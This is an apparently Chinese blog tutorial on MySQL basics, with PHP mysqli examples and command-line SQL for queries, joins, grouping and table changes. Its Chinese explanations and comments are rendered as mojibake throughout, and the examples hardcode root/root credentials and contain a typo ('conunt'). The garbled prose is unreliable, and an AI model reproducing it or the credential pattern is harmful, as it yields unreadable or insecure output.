<h4 id="4-å‘æ•°æ®åº“çš„è¡¨ä¸­æ’å…¥æ•°æ®"><a href="#4-å‘æ•°æ®åº“çš„è¡¨ä¸­æ’å…¥æ•°æ®" class="headerlink" title="4.å‘æ•°æ®åº“çš„è¡¨ä¸­æ’å…¥æ•°æ®"></a>4.å‘æ•°æ®åº“çš„è¡¨ä¸­æ’å…¥æ•°æ®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯­æ³•ä¸ºç¬¬ä¸€ç§</span><br><span class="line">INSERT INTO è¡¨å</span><br><span class="line">VALUES (value1, value2,....)</span><br><span class="line"></span><br><span class="line">ç¬¬äºŒç§</span><br><span class="line">INSERT INTO è¡¨å (column1, column2,...)</span><br><span class="line">VALUES (value1, value2,....)</span><br><span class="line"></span><br><span class="line">ç¬¬äºŒç§å¯ä»¥è§„å®šå¸Œæœ›åœ¨å…¶ä¸­æ’å…¥æ•°æ®çš„åˆ—</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);//è¿æ¥æœ¬åœ°æ•°æ®åº“</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);//é€‰æ‹©æ•°æ®åº“</span><br><span class="line">mysqli_query($con,&quot;insert into user (firstname,lastname,age)</span><br><span class="line">values(&#x27;peter&#x27;,&#x27;griffin&#x27;,&#x27;35&#x27;)&quot;);//åœ¨è¡¨ä¸­æ’å…¥æ•°æ®</span><br><span class="line">mysqli_close($con);//å…³é—­æœ¬åœ°æ•°æ®åº“çš„è¿æ¥</span><br></pre></td></tr></table></figure>

<h4 id="5-ä»-MySQL-æ•°æ®åº“è¯»å–æ•°æ®"><a href="#5-ä»-MySQL-æ•°æ®åº“è¯»å–æ•°æ®" class="headerlink" title="5.ä» MySQL æ•°æ®åº“è¯»å–æ•°æ®"></a>5.ä» MySQL æ•°æ®åº“è¯»å–æ•°æ®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯­æ³•</span><br><span class="line">SELECT åˆ—å FROM è¡¨å</span><br><span class="line">ç±»åé‚£ä½¿ç”¨*æ˜¯è·å–è¡¨ä¸­çš„å…¨éƒ¨æ•°æ®</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);</span><br><span class="line">$h=&#x27;select * from user&#x27;;//è·å–è¡¨ä¸­çš„å…¨éƒ¨æ•°æ®</span><br><span class="line">$y=mysqli_query($con,$h);</span><br><span class="line">while($row=mysqli_fetch_array($y))&#123;</span><br><span class="line">    echo $row[&#x27;firstname&#x27;];//è¾“å‡ºfirstnameè¿™ä¸€åˆ—çš„æ•°æ®</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line">//mysqli_fetch_array()æ˜¯ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºæ•°å­—æ•°ç»„æˆ–å…³è”æ•°ç»„</span><br></pre></td></tr></table></figure>

<h4 id="6-whereå­å¥"><a href="#6-whereå­å¥" class="headerlink" title="6.whereå­å¥"></a>6.whereå­å¥</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯­æ³•</span><br><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name operator value</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);</span><br><span class="line">$h=&quot;select * from user where firstname=&#x27;peter&#x27;&quot;;//è·å–è¡¨ä¸­peterè¿™ä¸€è¡Œçš„æ•°æ®</span><br><span class="line">$y=mysqli_query($con,$h);</span><br><span class="line">while($row=mysqli_fetch_array($y))&#123;</span><br><span class="line">    echo $row[&#x27;firstname&#x27;];//è¾“å‡ºfirstnameè¿™ä¸€åˆ—çš„æ•°æ®</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line">//mysqli_fetch_array()æ˜¯ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºæ•°å­—æ•°ç»„æˆ–å…³è”æ•°ç»„</span><br></pre></td></tr></table></figure>

<h4 id="7-ORDER-BY-å…³é”®è¯"><a href="#7-ORDER-BY-å…³é”®è¯" class="headerlink" title="7.ORDER BY å…³é”®è¯"></a>7.ORDER BY å…³é”®è¯</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯­æ³•</span><br><span class="line">SELECT åˆ—å</span><br><span class="line">FROM è¡¨å</span><br><span class="line">ORDER BY åˆ—å ASC|DESC  //ASCä¸ºå‡åºï¼ŒDESCä¸ºé™åºï¼Œå¯ä»¥çœç•¥ï¼Œçœç•¥ä¸ºå‡åº</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);</span><br><span class="line">$h=&quot;select * from user order by age&quot;;//æŒ‰ç…§ageè¿›è¡Œå‡åºæ’åˆ—</span><br><span class="line">$y=mysqli_query($con,$h);</span><br><span class="line">while($row=mysqli_fetch_array($y))&#123;</span><br><span class="line">    echo $row[&#x27;age&#x27;];//è¾“å‡ºageè¿™ä¸€åˆ—çš„è¿›è¡Œå‡åºåçš„æ•°æ®</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line">//mysqli_fetch_array()æ˜¯ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºæ•°å­—æ•°ç»„æˆ–å…³è”æ•°ç»„</span><br></pre></td></tr></table></figure>

<h4 id="8-updateæ›´æ–°æ•°æ®åº“ä¸­çš„æ•°æ®"><a href="#8-updateæ›´æ–°æ•°æ®åº“ä¸­çš„æ•°æ®" class="headerlink" title="8.updateæ›´æ–°æ•°æ®åº“ä¸­çš„æ•°æ®"></a>8.updateæ›´æ–°æ•°æ®åº“ä¸­çš„æ•°æ®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯­æ³•</span><br><span class="line">UPDATE table_name</span><br><span class="line">SET column1=value, column2=value2,...</span><br><span class="line">WHERE some_column=some_value</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);</span><br><span class="line">$h=&quot;update user set age=44 where firstname=&#x27;peter&#x27;&quot;;//ä¿®æ”¹è¡¨ä¸­peteré‚£ä¸€è¡Œageçš„å€¼</span><br><span class="line">mysqli_query($con,$h);</span><br><span class="line">mysqli_close($con);</span><br></pre></td></tr></table></figure>

<h4 id="9-deleteåˆ é™¤æ•°æ®åº“ä¸­çš„æ•°æ®"><a href="#9-deleteåˆ é™¤æ•°æ®åº“ä¸­çš„æ•°æ®" class="headerlink" title="9.deleteåˆ é™¤æ•°æ®åº“ä¸­çš„æ•°æ®"></a>9.deleteåˆ é™¤æ•°æ®åº“ä¸­çš„æ•°æ®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯­æ³•</span><br><span class="line">DELETE FROM è¡¨å</span><br><span class="line">WHERE some_column = some_value</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);</span><br><span class="line">$h=&quot;delete from user where age=10&quot;;//åˆ é™¤age=10è¿™ä¸€è¡Œ</span><br><span class="line">mysqli_query($con,$h);</span><br><span class="line">mysqli_close($con);</span><br></pre></td></tr></table></figure>

<h2 id="é€šè¿‡å‘½ä»¤è¡Œæ¥ä½¿ç”¨mysql"><a href="#é€šè¿‡å‘½ä»¤è¡Œæ¥ä½¿ç”¨mysql" class="headerlink" title="é€šè¿‡å‘½ä»¤è¡Œæ¥ä½¿ç”¨mysql"></a>é€šè¿‡å‘½ä»¤è¡Œæ¥ä½¿ç”¨mysql</h2><h4 id="1-è¿æ¥"><a href="#1-è¿æ¥" class="headerlink" title="1.è¿æ¥"></a>1.è¿æ¥</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@host]# mysql -u root -p</span><br></pre></td></tr></table></figure>

<h4 id="2-åˆ›å»ºæ•°æ®åº“-1"><a href="#2-åˆ›å»ºæ•°æ®åº“-1" class="headerlink" title="2.åˆ›å»ºæ•°æ®åº“"></a>2.åˆ›å»ºæ•°æ®åº“</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database æ•°æ®åº“å;</span><br><span class="line"></span><br><span class="line">mysqladmin -u root -p create æ•°æ®åº“å;  //å¯ä»¥åœ¨æ™®é€šç”¨æˆ·ä¸‹å‡ºåˆ›å»ºæ•°æ®åº“</span><br></pre></td></tr></table></figure>

<h4 id="3-åˆ é™¤æ•°æ®åº“"><a href="#3-åˆ é™¤æ•°æ®åº“" class="headerlink" title="3.åˆ é™¤æ•°æ®åº“"></a>3.åˆ é™¤æ•°æ®åº“</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database æ•°æ®åº“å;</span><br></pre></td></tr></table></figure>

<h4 id="4-é€‰æ‹©æ•°æ®åº“"><a href="#4-é€‰æ‹©æ•°æ®åº“" class="headerlink" title="4.é€‰æ‹©æ•°æ®åº“"></a>4.é€‰æ‹©æ•°æ®åº“</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt;show databases;  //å¯ä»¥æŸ¥çœ‹å…¨éƒ¨æ•°æ®åº“</span><br><span class="line">mysql&gt;use æ•°æ®åº“å;  //ä½¿ç”¨æ•°æ®åº“</span><br></pre></td></tr></table></figure>

<h4 id="5-åˆ›å»ºæ•°æ®åº“è¡¨"><a href="#5-åˆ›å»ºæ•°æ®åº“è¡¨" class="headerlink" title="5.åˆ›å»ºæ•°æ®åº“è¡¨"></a>5.åˆ›å»ºæ•°æ®åº“è¡¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table è¡¨å (åˆ—å ç±»å‹ï¼Œåˆ—å ç±»å‹);</span><br></pre></td></tr></table></figure>

<h4 id="6-åˆ é™¤æ•°æ®åº“è¡¨"><a href="#6-åˆ é™¤æ•°æ®åº“è¡¨" class="headerlink" title="6.åˆ é™¤æ•°æ®åº“è¡¨"></a>6.åˆ é™¤æ•°æ®åº“è¡¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table è¡¨å;</span><br></pre></td></tr></table></figure>

<h4 id="7-å‘æ•°æ®åº“è¡¨ä¸­æ’å…¥æ•°æ®"><a href="#7-å‘æ•°æ®åº“è¡¨ä¸­æ’å…¥æ•°æ®" class="headerlink" title="7.å‘æ•°æ®åº“è¡¨ä¸­æ’å…¥æ•°æ®"></a>7.å‘æ•°æ®åº“è¡¨ä¸­æ’å…¥æ•°æ®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into è¡¨å(åˆ—åï¼Œåˆ—åï¼Œåˆ—å)</span><br><span class="line">values(æ•°æ®1ï¼Œæ•°æ®2ï¼Œæ•°æ®3);</span><br></pre></td></tr></table></figure>

<h4 id="8-æŸ¥è¯¢æ•°æ®"><a href="#8-æŸ¥è¯¢æ•°æ®" class="headerlink" title="8.æŸ¥è¯¢æ•°æ®"></a>8.æŸ¥è¯¢æ•°æ®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select åˆ—å from è¡¨å;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select åˆ—å from è¡¨å limit 2;//è¿™æ˜¯è§„å®šæŸ¥è¯¢æ•°æ®çš„æ¡æ•°ï¼Œ2å°±æ˜¯æŸ¥è¯¢å‰2æ¡ï¼Œ1å°±æ˜¯æŸ¥è¯¢å‰1æ¡</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select åˆ—å from è¡¨å where name in (&#x27;name1&#x27;,&#x27;name2&#x27;);</span><br><span class="line">//æ˜¯ä»nameé‚£ä¸€åˆ—ä¸­è¿”å›name1å’Œname2è¿™ä¸¤æ¡è®°å½•</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where åˆ—å between 1 and 20;</span><br><span class="line">//æ˜¯ä»è¯¥åˆ—åä¸­é€‰å–æ•°æ®åœ¨1åˆ°20ä¹‹é—´çš„æ•°</span><br><span class="line">select * from user where åˆ—å not between 1 and 20;</span><br><span class="line">//æ˜¯ä¸é€‰å–æ•°æ®åœ¨1åˆ°20ä¹‹é—´çš„</span><br></pre></td></tr></table></figure>

<h4 id="9-whereå­å¥"><a href="#9-whereå­å¥" class="headerlink" title="9.whereå­å¥"></a>9.whereå­å¥</h4><p>è¿™æ˜¯userè¡¨é‡Œçš„æ•°æ®</p>
<p><img src="/2022/11/15/mysql%E5%9F%BA%E7%A1%80/image-20221023101502689.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where age=&#x27;10&#x27;;</span><br><span class="line">å¯ä»¥ç­›é€‰å‡ºage=10çš„æ‰€æœ‰æ•°æ®</span><br></pre></td></tr></table></figure>

<h4 id="10-updateæ›´æ–°"><a href="#10-updateæ›´æ–°" class="headerlink" title="10.updateæ›´æ–°"></a>10.updateæ›´æ–°</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update è¡¨å set åˆ—å=æ•°æ® where åˆ—å=&#x27;&#x27;;</span><br><span class="line">å¯ä»¥ä¿®æ”¹æ•°æ®</span><br></pre></td></tr></table></figure>

<h4 id="11-deleteè¯­å¥"><a href="#11-deleteè¯­å¥" class="headerlink" title="11.deleteè¯­å¥"></a>11.deleteè¯­å¥</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from è¡¨å [where åˆ—å=&#x27;&#x27;];</span><br><span class="line">å¦‚æœæ²¡æœ‰æŒ‡å®šwhereå°±ä¼šå°†æ•´ä¸ªè¡¨åˆ é™¤</span><br></pre></td></tr></table></figure>

<h4 id="12-likeå­å¥"><a href="#12-likeå­å¥" class="headerlink" title="12.likeå­å¥"></a>12.likeå­å¥</h4><p>åœ¨likeå­å¥ä¸­ä½¿ç”¨ç™¾åˆ†å·%å­—ç¬¦æ¥è¡¨ç¤ºä»»æ„å­—ç¬¦</p>
<p>likeå¯ä»¥ä»£æ›¿&#x3D;å·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from è¡¨å where åˆ—å like &quot;%com&quot;</span><br><span class="line">å°±æ˜¯ä»è¡¨ä¸­æœç´¢å¸¦æœ‰comçš„æ•°æ®</span><br></pre></td></tr></table></figure>

<h4 id="13-unionæ“ä½œç¬¦"><a href="#13-unionæ“ä½œç¬¦" class="headerlink" title="13.unionæ“ä½œç¬¦"></a>13.unionæ“ä½œç¬¦</h4><p>UNION æ“ä½œç¬¦ç”¨äºè¿æ¥ä¸¤ä¸ªä»¥ä¸Šçš„ SELECT è¯­å¥çš„ç»“æœç»„åˆåˆ°ä¸€ä¸ªç»“æœé›†åˆä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select åˆ—å from è¡¨å [where] union select åˆ—å from è¡¨å [where];</span><br><span class="line">å¦‚æœé€‰å–çš„æ•°æ®ä¸­æœ‰ä¸€æ ·çš„æ•°æ®é‚£åªä¼šåˆ—å‡ºä¸€ä¸ªï¼Œå¦‚æœæƒ³è¦è¾“å‡ºçš„æœ‰é‡å¤çš„æ•°æ®ï¼Œé‚£å°±è¦ä½¿ç”¨union all</span><br></pre></td></tr></table></figure>

<h4 id="14-order-byæ’åº"><a href="#14-order-byæ’åº" class="headerlink" title="14.order byæ’åº"></a>14.order byæ’åº</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select ç±»å from è¡¨å order by åˆ—å [ASC/DESC];</span><br><span class="line">//ASCæ˜¯å‡åºï¼ŒDESCæ˜¯é™åºï¼Œå¦‚æœä¸è¡¨æ˜æ˜¯å‡åºè¿˜æ˜¯é™åºï¼Œé‚£ä¹ˆé»˜è®¤æ˜¯å‡åº</span><br></pre></td></tr></table></figure>

<h4 id="15-group-byè¯­å¥"><a href="#15-group-byè¯­å¥" class="headerlink" title="15.group byè¯­å¥"></a>15.group byè¯­å¥</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿™æ˜¯ä¸€ä¸ªæ•°æ®åº“è¡¨,åå­—ä¸ºemployee_tbl</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">| id | name   | date                | signin |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">|  1 | å°æ˜ | 2016-04-22 15:25:33 |      1 |</span><br><span class="line">|  2 | å°ç‹ | 2016-04-20 15:25:47 |      3 |</span><br><span class="line">|  3 | å°ä¸½ | 2016-04-19 15:26:02 |      2 |</span><br><span class="line">|  4 | å°ç‹ | 2016-04-07 15:26:14 |      4 |</span><br><span class="line">|  5 | å°æ˜ | 2016-04-11 15:26:40 |      4 |</span><br><span class="line">|  6 | å°æ˜ | 2016-04-04 15:26:54 |      2 |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä½¿ç”¨select name ,conunt(*) from employee_tbl group by name;</span><br><span class="line">//ä¼šå°†è¡¨æŒ‰ç…§åå­—è¿›è¡Œåˆ†ç»„ï¼Œå¹¶ç»Ÿè®¡æ¯ä¸ªåå­—å‡ºç°çš„æ¬¡æ•°</span><br><span class="line">+--------+----------+</span><br><span class="line">| name   | COUNT(*) |</span><br><span class="line">+--------+----------+</span><br><span class="line">| å°ä¸½ |        1 |</span><br><span class="line">| å°æ˜ |        3 |</span><br><span class="line">| å°ç‹ |        2 |</span><br><span class="line">+--------+----------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä½¿ç”¨with rollup</span><br><span class="line">select name,SUM(signin) as signin_count from employee_tbl group by name with rollup;</span><br><span class="line">//with rollupå¯ä»¥å°†æ•°æ®åˆ†ç»„å†è¿›è¡Œsigninçš„ç»Ÿè®¡ç›¸åŠ </span><br><span class="line">+--------+--------------+</span><br><span class="line">| name   | signin_count |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| å°ä¸½ |            2 |</span><br><span class="line">| å°æ˜ |            7 |</span><br><span class="line">| å°ç‹ |            7 |</span><br><span class="line">| NULL   |           16 |</span><br><span class="line">+--------+--------------+</span><br></pre></td></tr></table></figure>

<h4 id="16-è¿æ¥çš„ä½¿ç”¨"><a href="#16-è¿æ¥çš„ä½¿ç”¨" class="headerlink" title="16.è¿æ¥çš„ä½¿ç”¨"></a>16.è¿æ¥çš„ä½¿ç”¨</h4><p>inner join(å†…è¿æ¥):è·å–ä¸¤ä¸ªè¡¨ä¸­å­—æ®µåŒ¹é…å…³ç³»çš„è®°å½•</p>
<p>left join(å·¦è¿æ¥):è·å–å·¦è¡¨æ‰€æœ‰è®°å½•ï¼Œå³ä½¿å³è¡¨æ²¡æœ‰å¯¹åº”åŒ¹é…çš„è®°å½•</p>
<p>right join(å³è¿æ¥):è·å–å³è¡¨æ‰€æœ‰è®°å½•ï¼Œå³ä½¿å·¦è¡¨æ²¡æœ‰å¯¹åº”åŒ¹é…çš„è®°å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcount_tblè¡¨</span><br><span class="line">mysql&gt; SELECT * FROM tcount_tbl;</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| runoob_author | runoob_count |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| èœé¸Ÿæ•™ç¨‹  | 10           |</span><br><span class="line">| RUNOOB.COM    | 20           |</span><br><span class="line">| Google        | 22           |</span><br><span class="line">+---------------+--------------+</span><br><span class="line"></span><br><span class="line">runoob_tblè¡¨</span><br><span class="line">mysql&gt; SELECT * from runoob_tbl;</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| 1         | å­¦ä¹  PHP    | èœé¸Ÿæ•™ç¨‹  | 2017-04-12      |</span><br><span class="line">| 2         | å­¦ä¹  MySQL  | èœé¸Ÿæ•™ç¨‹  | 2017-04-12      |</span><br><span class="line">| 3         | å­¦ä¹  Java   | RUNOOB.COM    | 2015-05-01      |</span><br><span class="line">| 4         | å­¦ä¹  Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">| 5         | å­¦ä¹  C      | FK            | 2017-04-05      |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨inner join</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select a.runoob_id,a.runoob_author,b.runoob_count from runoob_tbl a inner join tcount_tbl b on a.runoob_author=b.runoob_author;</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| a.runoob_id | a.runoob_author | b.runoob_count |</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| 1           | èœé¸Ÿæ•™ç¨‹    | 10             |</span><br><span class="line">| 2           | èœé¸Ÿæ•™ç¨‹    | 10             |</span><br><span class="line">| 3           | RUNOOB.COM      | 20             |</span><br><span class="line">| 4           | RUNOOB.COM      | 20             |</span><br><span class="line">+-------------+-----------------+----------------+</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨left join</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a LEFT JOIN tcount_tbl b ON a.runoob_author = b.runoob_author;</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| a.runoob_id | a.runoob_author | b.runoob_count |</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| 1           | èœé¸Ÿæ•™ç¨‹    | 10             |</span><br><span class="line">| 2           | èœé¸Ÿæ•™ç¨‹    | 10             |</span><br><span class="line">| 3           | RUNOOB.COM      | 20             |</span><br><span class="line">| 4           | RUNOOB.COM      | 20             |</span><br><span class="line">| 5           | FK              | NULL           |</span><br><span class="line">+-------------+-----------------+----------------+</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨right join</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a RIGHT JOIN tcount_tbl b ON a.runoob_author = b.runoob_author;</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| a.runoob_id | a.runoob_author | b.runoob_count |</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| 1           | èœé¸Ÿæ•™ç¨‹    | 10             |</span><br><span class="line">| 2           | èœé¸Ÿæ•™ç¨‹    | 10             |</span><br><span class="line">| 3           | RUNOOB.COM      | 20             |</span><br><span class="line">| 4           | RUNOOB.COM      | 20             |</span><br><span class="line">| NULL        | NULL            | 22             |</span><br><span class="line">+-------------+-----------------+----------------+</span><br></pre></td></tr></table></figure>

<p>17.nullå€¼å¤„ç†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å­˜åœ¨ä¸€ä¸ªå¦‚ä¸‹æ•°æ®åº“</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| runoob_author | runoob_count |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| RUNOOB        | 20           |</span><br><span class="line">| èœé¸Ÿæ•™ç¨‹  | NULL         |</span><br><span class="line">| Google        | NULL         |</span><br><span class="line">| FK            | 20           |</span><br><span class="line">+---------------+--------------+</span><br><span class="line"></span><br><span class="line">SELECT * FROM runoob_test_tbl WHERE runoob_count IS NULL;//å¦‚æœå°†is nullæ”¹ä¸º=nullå°†æ— ä½œç”¨</span><br><span class="line">å¯ä»¥è¿”å›</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| runoob_author | runoob_count |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| èœé¸Ÿæ•™ç¨‹  | NULL         |</span><br><span class="line">| Google        | NULL         |</span><br><span class="line">+---------------+--------------+</span><br><span class="line"></span><br><span class="line">SELECT * from runoob_test_tbl WHERE runoob_count IS NOT NULL;</span><br><span class="line">å¯ä»¥è¿”å›</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| runoob_author | runoob_count |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| RUNOOB        | 20           |</span><br><span class="line">| FK            | 20           |</span><br><span class="line">+---------------+--------------+</span><br></pre></td></tr></table></figure>

<h4 id="18-æ­£åˆ™è¡¨è¾¾å¼"><a href="#18-æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="18.æ­£åˆ™è¡¨è¾¾å¼"></a>18.æ­£åˆ™è¡¨è¾¾å¼</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT name FROM person_tbl WHERE name REGEXP &#x27;^st&#x27;;//æŸ¥æ‰¾nameå­—æ®µä¸­ä»¥&#x27;st&#x27;ä¸ºå¼€å¤´çš„æ‰€æœ‰æ•°æ®SELECT name FROM person_tbl WHERE name REGEXP &#x27;ok$&#x27;;//æŸ¥æ‰¾nameå­—æ®µä¸­ä»¥&#x27;ok&#x27;ä¸ºç»“å°¾çš„æ‰€æœ‰æ•°æ®</span><br><span class="line">SELECT name FROM person_tbl WHERE name REGEXP &#x27;mar&#x27;;//æŸ¥æ‰¾nameå­—æ®µä¸­åŒ…å«&#x27;mar&#x27;å­—ç¬¦ä¸²çš„æ‰€æœ‰æ•°æ®</span><br><span class="line">SELECT name FROM person_tbl WHERE name REGEXP &#x27;^[aeiou]|ok$&#x27;;//æŸ¥æ‰¾nameå­—æ®µä¸­ä»¥å…ƒéŸ³å­—ç¬¦å¼€å¤´æˆ–ä»¥&#x27;ok&#x27;å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰æ•°æ®</span><br></pre></td></tr></table></figure>

<h4 id="19-alterå‘½ä»¤"><a href="#19-alterå‘½ä»¤" class="headerlink" title="19.alterå‘½ä»¤"></a>19.alterå‘½ä»¤</h4><p>å½“æˆ‘ä»¬éœ€è¦ä¿®æ”¹æ•°æ®è¡¨åæˆ–è€…ä¿®æ”¹æ•°æ®è¡¨å­—æ®µæ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨åˆ°MySQL ALTERå‘½ä»¤</p>
<p><strong>åˆ é™¤ï¼Œæ·»åŠ æˆ–ä¿®æ”¹è¡¨å­—æ®µ</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å drop è¡¨ä¸­çš„å­—æ®µ  //æ˜¯åˆ é™¤è¯¥å­—æ®µçš„å…¨éƒ¨å†…å®¹ï¼Œå¦‚æœè¯¥è¡¨ä¸­åªæœ‰ä¸€ä¸ªå­—æ®µåˆ™æ— æ³•åˆ é™¤</span><br><span class="line">alter table è¡¨å add è¡¨ä¸­çš„å­—æ®µ ç±»å‹  //æ˜¯åœ¨æ·»åŠ å­—æ®µå¹¶è§„å®šå…¶ç±»å‹</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¦æŒ‡å®šæ–°å¢å­—æ®µçš„ä½ç½®ä½¿ç”¨FIRST (è®¾å®šä½ç¬¬ä¸€åˆ—)ï¼Œ AFTER å­—æ®µåï¼ˆè®¾å®šä½äºæŸä¸ªå­—æ®µä¹‹åï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE è¡¨å ADD i INT FIRST;//æ˜¯æ·»åŠ iåœ¨è¡¨çš„æœ€å‰é¢</span><br><span class="line">ALTER TABLE è¡¨å ADD i INT AFTER c;//æ˜¯åœ¨cå­—æ®µåæ·»åŠ iå­—æ®µ</span><br></pre></td></tr></table></figure>

<p><strong>ä¿®æ”¹å­—æ®µç±»å‹åŠåç§°</strong></p>
<p>å¦‚æœéœ€è¦ä¿®æ”¹å­—æ®µç±»å‹åŠåç§°, ä½ å¯ä»¥åœ¨ALTERå‘½ä»¤ä¸­ä½¿ç”¨ MODIFY æˆ– CHANGE å­å¥</p>
